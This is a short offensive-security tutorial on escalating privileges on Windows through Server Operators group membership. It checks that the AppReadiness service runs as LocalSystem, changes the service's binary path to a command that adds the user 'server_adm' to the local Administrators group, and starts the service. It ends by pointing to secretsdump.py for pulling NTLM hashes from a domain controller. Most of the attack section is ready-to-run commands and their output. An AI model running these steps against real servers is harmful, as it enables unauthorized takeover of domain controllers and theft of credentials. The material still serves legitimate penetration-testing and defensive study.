### Content

- [Overview](#overview)
- [AppReadiness Service Abuse](#appreadiness-service-abuse)
	- [Checking service's privileges](#checking-service's-privileges)
	- [Abusing the privileges](#abusing-the-privileges)

---
#### Overview

Members of The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) allowed to administer Windows servers without assignment of Domain Admin privileges.
It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group gives `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

---
### AppReadiness Service Abuse 

#### Checking service's privileges

Confirm that this service starts as SYSTEM using the sc.exe utility.

```CMD
C:\> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite.

```CMD
C:\> c:\Tools\PsService.exe security AppReadiness

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

This confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.

#### Abusing the privileges

Checking the local administrators group

```CMD
C:\> net localgroup Administrators

Administrator
Domain Admins
Enterprise Admins

```

Now, change the binary path to execute a command which adds our current user to the default local administrators group.

```CMD
C:\> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Try to start the service, which will fail due to the magical path ( our command :} ), then checking the local admin group again.

```CMD 
C:\> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\> net localgroup Administrators

Administrator
Domain Admins
Enterprise Admins
server_adm

```

Now we can use `secretsdump.py` to dump retrieve NTLM hashes from the domain controller.

---
